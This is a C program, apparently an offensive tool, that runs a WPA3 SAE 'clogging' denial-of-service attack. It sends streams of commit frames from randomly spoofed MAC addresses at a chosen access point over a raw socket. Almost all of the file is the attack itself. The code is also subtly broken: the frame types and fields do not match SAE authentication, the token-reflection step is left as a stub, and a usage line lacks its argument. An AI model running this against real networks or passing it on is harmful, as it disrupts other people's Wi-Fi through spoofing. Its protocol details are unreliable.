#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

#define MAX_COMMIT_FRAMES 1000
#define COMMIT_RETRY_DELAY 1000 // microseconds

// SAE frame structures
struct sae_commit_frame {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t da[6];      // destination MAC
    uint8_t sa[6];      // source MAC (spoofed)
    uint8_t bssid[6];   // AP MAC
    uint8_t seq_ctrl[2];
    uint8_t category;
    uint8_t action;
    uint8_t status;
    uint8_t group_id;
    uint8_t scalar[32];  // ECC scalar (fake)
    uint8_t element[64]; // ECC element (fake)
    uint16_t finite_cyclic_group;
} __attribute__((packed));

struct sae_commit_response {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t da[6];      // destination MAC (our spoofed MAC)
    uint8_t sa[6];      // source MAC (AP)
    uint8_t bssid[6];   // AP MAC
    uint8_t seq_ctrl[2];
    uint8_t category;
    uint8_t action;
    uint8_t token[32];  // anti-clogging token
} __attribute__((packed));

struct attack_context {
    char *interface;
    uint8_t ap_mac[6];
    int socket_fd;
    int running;
    pthread_t receiver_thread;
};

// Generate random MAC address
void generate_random_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = rand() & 0xFF;
    }
    // Set locally administered bit
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
}

// Create SAE commit frame
void create_commit_frame(struct sae_commit_frame *frame, uint8_t *spoofed_mac, uint8_t *ap_mac) {
    // Frame control (Data frame)
    frame->frame_control[0] = 0x08; // Version 0, Data
    frame->frame_control[1] = 0x00;
    
    // Duration
    frame->duration[0] = 0x00;
    frame->duration[1] = 0x00;
    
    // MAC addresses
    memcpy(frame->da, ap_mac, 6);
    memcpy(frame->sa, spoofed_mac, 6);
    memcpy(frame->bssid, ap_mac, 6);
    
    // Sequence control
    frame->seq_ctrl[0] = 0x00;
    frame->seq_ctrl[1] = 0x00;
    
    // SAE action frame fields
    frame->category = 0x01; // Public action frame
    frame->action = 0x00;   // SAE commit
    frame->status = 0x00;
    frame->group_id = 0x01; // Default group
    
    // Fill with random data for scalar and element
    for (int i = 0; i < 32; i++) {
        frame->scalar[i] = rand() & 0xFF;
    }
    for (int i = 0; i < 64; i++) {
        frame->element[i] = rand() & 0xFF;
    }
    
    // Finite cyclic group (NIST P-256)
    frame->finite_cyclic_group = htons(19);
}

// Send raw frame
int send_raw_frame(int sockfd, void *frame, size_t frame_len, char *interface) {
    struct sockaddr_ll socket_addr;
    
    memset(&socket_addr, 0, sizeof(socket_addr));
    socket_addr.sll_family = AF_PACKET;
    socket_addr.sll_protocol = htons(ETH_P_ALL);
    socket_addr.sll_ifindex = if_nametoindex(interface);
    socket_addr.sll_halen = ETH_ALEN;
    
    // Use broadcast address for destination
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(socket_addr.sll_addr, broadcast_mac, ETH_ALEN);
    
    int sent = sendto(sockfd, frame, frame_len, 0, 
                     (struct sockaddr*)&socket_addr, sizeof(socket_addr));
    
    return sent;
}

// Process incoming frames (for token reflection)
void* frame_receiver(void *arg) {
    struct attack_context *ctx = (struct attack_context*)arg;
    uint8_t buffer[4096];
    
    printf("[*] Starting frame receiver thread\n");
    
    while (ctx->running) {
        int len = recv(ctx->socket_fd, buffer, sizeof(buffer), 0);
        if (len < 0) {
            continue;
        }
        
        // Check if this is an SAE commit response with anti-clogging token
        if (len >= sizeof(struct sae_commit_response)) {
            struct sae_commit_response *resp = (struct sae_commit_response*)buffer;
            
            // Check if it's an SAE commit response (action frame)
            if (resp->category == 0x01 && resp->action == 0x01) {
                printf("[+] Received anti-clogging token from AP\n");
                
                // Here you would reflect the token back to complete the handshake
                // This requires parsing the token and sending appropriate response
                // For demonstration, we just acknowledge receipt
            }
        }
    }
    
    return NULL;
}

// Initialize raw socket
int init_raw_socket(char *interface) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    
    // Bind to interface
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = if_nametoindex(interface);
    
    if (bind(sockfd, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

// Main attack function
void run_clogging_attack(struct attack_context *ctx) {
    struct sae_commit_frame commit_frame;
    uint8_t spoofed_mac[6];
    int frame_count = 0;
    
    printf("[*] Starting SAE clogging attack against AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
           ctx->ap_mac[0], ctx->ap_mac[1], ctx->ap_mac[2],
           ctx->ap_mac[3], ctx->ap_mac[4], ctx->ap_mac[5]);
    
    while (ctx->running && frame_count < MAX_COMMIT_FRAMES) {
        // Generate new spoofed MAC
        generate_random_mac(spoofed_mac);
        
        // Create commit frame
        create_commit_frame(&commit_frame, spoofed_mac, ctx->ap_mac);
        
        // Send the frame
        int sent = send_raw_frame(ctx->socket_fd, &commit_frame, 
                                 sizeof(commit_frame), ctx->interface);
        
        if (sent > 0) {
            frame_count++;
            printf("[+] Sent commit frame %d from spoofed MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   frame_count, spoofed_mac[0], spoofed_mac[1], spoofed_mac[2],
                   spoofed_mac[3], spoofed_mac[4], spoofed_mac[5]);
        } else {
            printf("[-] Failed to send frame\n");
        }
        
        // Small delay to avoid overwhelming the system
        usleep(COMMIT_RETRY_DELAY);
    }
    
    printf("[*] Attack completed. Sent %d commit frames\n", frame_count);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <interface> <AP_MAC>\n", argv[0]);
        printf("Example: %s wlan0 00:11:22:33:44:55\n");
        return 1;
    }
    
    struct attack_context ctx;
    memset(&ctx, 0, sizeof(ctx));
    
    ctx.interface = argv[1];
    
    // Parse AP MAC address
    if (sscanf(argv[2], "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &ctx.ap_mac[0], &ctx.ap_mac[1], &ctx.ap_mac[2],
               &ctx.ap_mac[3], &ctx.ap_mac[4], &ctx.ap_mac[5]) != 6) {
        printf("[-] Invalid MAC address format\n");
        return 1;
    }
    
    // Initialize raw socket
    ctx.socket_fd = init_raw_socket(ctx.interface);
    if (ctx.socket_fd < 0) {
        printf("[-] Failed to initialize raw socket\n");
        return 1;
    }
    
    printf("[+] Raw socket initialized on %s\n", ctx.interface);
    
    // Seed random number generator
    srand(time(NULL));
    
    ctx.running = 1;
    
    // Start receiver thread for token handling
    if (pthread_create(&ctx.receiver_thread, NULL, frame_receiver, &ctx) != 0) {
        printf("[-] Failed to start receiver thread\n");
        close(ctx.socket_fd);
        return 1;
    }
    
    // Run the attack
    run_clogging_attack(&ctx);
    
    // Cleanup
    ctx.running = 0;
    pthread_join(ctx.receiver_thread, NULL);
    close(ctx.socket_fd);
    
    printf("[*] Attack finished\n");
    return 0;
}
